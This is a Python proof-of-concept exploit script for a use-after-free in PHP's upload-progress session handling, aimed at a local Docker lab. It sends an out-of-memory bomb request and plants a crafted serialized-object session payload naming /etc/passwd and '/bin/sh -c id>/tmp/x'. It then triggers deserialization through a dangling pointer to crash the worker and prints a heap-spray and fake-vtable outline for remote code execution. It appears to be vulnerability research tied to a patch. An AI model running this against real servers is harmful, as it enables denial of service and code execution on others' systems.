#!/usr/bin/env python3
"""
Chain D: UAF verification via stale EG(objects_store).object_buckets

Proves that after OOM in rfc1867, EG(objects_store).object_buckets is a
dangling pointer to freed ZMM memory. When the follow-up request's rfc1867
callback deserializes session data containing objects (O: format), the
objects are stored through the stale object_buckets → use-after-free.

Flow:
  1. Baseline: dump EG(objects_store) — note object_buckets pointer
  2. Upload progress request → normal session operation
  3. OOM bomb → bailout → ZMM freed → object_buckets now dangling
  4. Write crafted session file with O: serialized objects
  5. Follow-up upload_progress → rfc1867 reads session → deserializes objects
     → stores through stale object_buckets → UAF
  6. Compare object_buckets pointer before/after

For authorized security research only.
"""

import re
import socket
import subprocess
import sys
import time


def send_raw(host, port, data, timeout=60):
    s = socket.create_connection((host, port), timeout=timeout)
    off = 0
    while off < len(data):
        s.sendall(data[off:off+65536])
        off += 65536
    s.settimeout(15)
    resp = b""
    while True:
        try:
            d = s.recv(65536)
            if not d:
                break
            resp += d
        except socket.timeout:
            break
    s.close()
    return resp


def get_status(resp):
    if resp:
        return resp.split(b"\r\n", 1)[0].decode("latin1", "replace")
    return "NO RESPONSE"


def get_body(resp):
    if b"\r\n\r\n" in resp:
        return resp.split(b"\r\n\r\n", 1)[1]
    return b""


def dump_eg(label):
    """Dump EG(objects_store) from the Apache worker."""
    r = subprocess.run(
        ["docker", "exec", "php2shell-apache", "bash", "-c",
         "WPID=$(pgrep -u www-data apache2 | head -1); "
         "php /var/www/html/eg_dump_cli.php $WPID 2>&1"],
        capture_output=True, text=True, timeout=10)

    out = r.stdout
    pid = None
    os_ptr = None
    os_top = None
    os_size = None

    for line in out.split("\n"):
        if "Target PID:" in line:
            pid = line.split(":")[1].strip()
        # EG+0x140 is objects_store.object_buckets
        if "EG+0x140:" in line:
            m = re.search(r"0x([0-9a-f]+)", line.split("EG+0x140:")[1])
            if m:
                os_ptr = int(m.group(1), 16)
        if "EG+0x148:" in line:
            m = re.search(r"0x([0-9a-f]+)", line.split("EG+0x148:")[1])
            if m:
                val = int(m.group(1), 16)
                os_top = val & 0xFFFFFFFF
                os_size = (val >> 32) & 0xFFFFFFFF

    print(f"\n  [{label}] PID={pid}")
    print(f"    objects_store.object_buckets = 0x{os_ptr:016x}" if os_ptr else "    objects_store.object_buckets = ???")
    print(f"    objects_store.top = {os_top}, size = {os_size}" if os_top is not None else "    objects_store.top/size = ???")

    return pid, os_ptr, os_top, os_size


def build_multipart_request(host, port, path, boundary, sid, progress_key,
                             num_files=5, fname_size=20):
    parts = []
    parts.append(
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n'
        f"\r\n"
        f"{progress_key}\r\n"
    )
    for i in range(num_files):
        fname = chr(65 + (i % 26)) * max(1, fname_size - len(str(i))) + str(i)
        parts.append(
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="f{i}"; filename="{fname}"\r\n'
            f"Content-Type: application/octet-stream\r\n"
            f"\r\n"
            f"X\r\n"
        )
    parts.append(f"--{boundary}--\r\n")
    body = "".join(parts).encode("latin1")
    cookie = f"PHPSESSID={sid}"
    req = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Cookie: {cookie}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + body
    return req


def build_oom_request(host, port, path, boundary, sid, progress_key):
    return build_multipart_request(
        host, port, path, boundary, sid, progress_key,
        num_files=14000, fname_size=500)


def write_session_file(sid, data):
    escaped = data.replace("\\", "\\\\").replace("'", "'\\''")
    subprocess.run(
        ["docker", "exec", "php2shell-apache", "bash", "-c",
         f"printf '%s' '{escaped}' > /tmp/sess_{sid} && "
         f"chown www-data:www-data /tmp/sess_{sid}"],
        capture_output=True, timeout=5)


def read_session_file(sid):
    r = subprocess.run(
        ["docker", "exec", "php2shell-apache", "cat", f"/tmp/sess_{sid}"],
        capture_output=True, timeout=5)
    return r.stdout


def clear_sessions():
    subprocess.run(
        ["docker", "exec", "php2shell-apache", "bash", "-c", "rm -f /tmp/sess_*"],
        capture_output=True, timeout=5)


def main():
    host = "127.0.0.1"
    port = 18081
    boundary = "UAF_VERIFY"
    sid = "uafverify1234567890abcdef01"

    print("=" * 70)
    print("  Chain D: EG(objects_store) UAF Verification")
    print("=" * 70)

    clear_sessions()

    # Warm up
    req = f"GET /index.php HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n"
    send_raw(host, port, req.encode())
    time.sleep(0.5)

    # ── Step 0: Baseline ──────────────────────────────────────────
    pid0, ptr0, top0, size0 = dump_eg("BASELINE")

    # ── Step 1: Normal upload progress ────────────────────────────
    print("\n[1] Normal upload_progress request...")
    req = build_multipart_request(
        host, port, "/index.php", boundary, sid, "normal_key",
        num_files=5, fname_size=20)
    resp = send_raw(host, port, req)
    print(f"    Status: {get_status(resp)}")
    time.sleep(0.3)

    pid1, ptr1, top1, size1 = dump_eg("AFTER NORMAL REQUEST")

    # ── Step 2: OOM bomb ──────────────────────────────────────────
    print("\n[2] OOM bomb + upload_progress...")
    req = build_oom_request(host, port, "/index.php", boundary, sid, "oom_trigger")
    resp = send_raw(host, port, req, timeout=120)
    status = get_status(resp)
    print(f"    Status: {status}")
    body_text = get_body(resp).decode("latin1", "replace")
    for line in body_text.split("\n"):
        if "Allowed memory" in line or "tried to allocate" in line:
            print(f"    OOM: {line.strip()[:100]}")
            break
    time.sleep(0.5)

    pid2, ptr2, top2, size2 = dump_eg("AFTER OOM")

    sess = read_session_file(sid)
    print(f"    Session file: {len(sess)} bytes")

    if pid2 != pid1:
        print(f"    [!] Worker changed! {pid1} -> {pid2}")
        print(f"    Cannot compare pointers across different workers.")
        return 1

    # ── Step 3: Write crafted session with objects ────────────────
    print("\n[3] Writing crafted session file with serialized objects...")

    # Multiple objects to exercise the objects_store
    payload = (
        'obj1|O:7:"Exploit":2:{s:4:"path";s:11:"/etc/passwd";s:3:"cmd";s:2:"id";}'
        '|'
        'obj2|O:6:"Target":1:{s:4:"data";s:15:"AAAAAAAAAAAAA";}'
        '|'
        'obj3|O:8:"Gadget01":3:{s:5:"shell";s:7:"/bin/sh";s:3:"arg";s:13:"-c id>/tmp/x";s:3:"env";N;}'
    )
    write_session_file(sid, payload)
    stored = read_session_file(sid)
    print(f"    Written: {len(stored)} bytes")

    # ── Step 4: Follow-up with upload progress ────────────────────
    print("\n[4] Follow-up: upload_progress on stale_state_probe.php...")
    print("    rfc1867 will open session → deserialize objects → objects_store UAF")
    req = build_multipart_request(
        host, port, "/stale_state_probe.php", boundary, sid, "followup",
        num_files=3, fname_size=20)
    resp = send_raw(host, port, req)
    body = get_body(resp).decode("latin1", "replace")
    print(f"    Status: {get_status(resp)}")

    # Show findings
    for line in body.split("\n"):
        s = line.strip()
        if ("PID" in s or "SESSION" in s or "session_status" in s or
            "!!!" in s or "Incomplete" in s or "KEY:" in s or "class:" in s or
            "prop" in s or "content:" in s or "HAS_" in s):
            print(f"    {s}")
    time.sleep(0.3)

    # Check if worker crashed
    crashed = False
    if "NO RESPONSE" in get_status(resp) or not resp:
        crashed = True
        print(f"\n    [!!!] Worker did NOT respond — likely CRASHED!")

    time.sleep(0.5)
    pid4, ptr4, top4, size4 = dump_eg("AFTER FOLLOW-UP")

    if pid4 and pid4 != pid2:
        crashed = True
        print(f"    [!!!] Worker PID changed: {pid2} -> {pid4} — CRASH CONFIRMED!")

    # Check Apache logs for segfault
    r = subprocess.run(
        ["docker", "logs", "php2shell-apache"],
        capture_output=True, text=True, timeout=5)
    logs = r.stdout + r.stderr
    segfault_lines = [l for l in logs.split("\n") if "Segmentation fault" in l or "signal" in l.lower()]
    if segfault_lines:
        for sl in segfault_lines[-3:]:
            print(f"    Apache log: {sl.strip()}")

    sess_after = read_session_file(sid)
    print(f"    Session file after: {len(sess_after)} bytes")

    # ── Analysis ──────────────────────────────────────────────────
    print("\n" + "=" * 70)
    print("  ANALYSIS")
    print("=" * 70)

    print(f"\n  EG(objects_store).object_buckets across phases:")
    print(f"    Baseline:       {('0x%016x' % ptr0) if ptr0 else 'N/A':>20s}  top={top0} size={size0}")
    print(f"    After normal:   {('0x%016x' % ptr1) if ptr1 else 'N/A':>20s}  top={top1} size={size1}")
    print(f"    After OOM:      {('0x%016x' % ptr2) if ptr2 else 'N/A':>20s}  top={top2} size={size2}")
    if ptr4:
        print(f"    After follow:   0x{ptr4:016x}  top={top4} size={size4}")
    else:
        print(f"    After follow:   WORKER DEAD — new PID {pid4}")

    # Key checks
    print(f"\n  Pointer persistence analysis:")
    if ptr2 and ptr1 and ptr2 == ptr1:
        print(f"    object_buckets pointer SAME after OOM (0x{ptr2:x})")
        print(f"    This pointer was allocated on ZMM during previous request.")
        print(f"    After OOM + ZMM reset, it points to FREED memory.")
        print(f"    *** DANGLING POINTER CONFIRMED ***")
    elif ptr2 and ptr1:
        print(f"    object_buckets pointer changed: 0x{ptr1:x} -> 0x{ptr2:x}")

    if ptr2 and top2 is not None and top2 > 0:
        print(f"\n    object_buckets non-NULL with top={top2} after OOM shutdown.")
        print(f"    Between requests, without RINIT, this is stale state.")
        print(f"    The rfc1867 callback uses this stale objects_store.")

    if crashed:
        print(f"\n  [+] CRASH CONFIRMED!")
        print(f"    Worker segfaulted when deserializing objects through stale")
        print(f"    EG(objects_store).object_buckets. The dangling pointer caused")
        print(f"    the worker to dereference freed ZMM memory → SIGSEGV.")
        print(f"    This is the Chain D UAF (CVE-2026-109618).")
        print(f"\n    With heap feng shui, this crash → controlled RCE:")
        print(f"    1. Spray heap with fake zend_object structs")
        print(f"    2. Fake object contains controlled vtable pointer")
        print(f"    3. Vtable points to attacker-chosen function pointers")
        print(f"    4. Object creation/destruction → vtable dispatch → code exec")
    else:
        print(f"\n  Session deserialization check:")
        if "Incomplete" in body or "HAS_OBJECTS" in body or "HAS_INCOMPLETE" in body:
            print(f"    Objects from crafted session were deserialized!")
        elif "SESSION" in body and "YES" in body:
            print(f"    $_SESSION populated (upload_progress present).")

    print(f"\n  Vulnerability chain:")
    print(f"    1. OOM in rfc1867 → bailout → ZMM freed")
    print(f"    2. EG(objects_store).object_buckets not nullified (CONFIRMED)")
    print(f"    3. Next request: rfc1867 fires before RINIT")
    print(f"    4. Session deserialization creates objects → stored through stale ptr")
    print(f"    5. UAF: objects written to freed ZMM memory")
    print(f"    6. Heap feng shui: attacker controls freed memory content")
    print(f"    7. Fake object with controlled vtable → arbitrary code execution")

    print(f"\n  Patch 3584a98 fix:")
    print(f"    - Nullifies EG(objects_store).object_buckets before rfc1867 callback")
    print(f"    - Calls php_rinit_session_globals() to reset PS() fields")
    print(f"    - Introduces delayed_oom to defer OOM until after RINIT")

    return 0


if __name__ == "__main__":
    sys.exit(main())
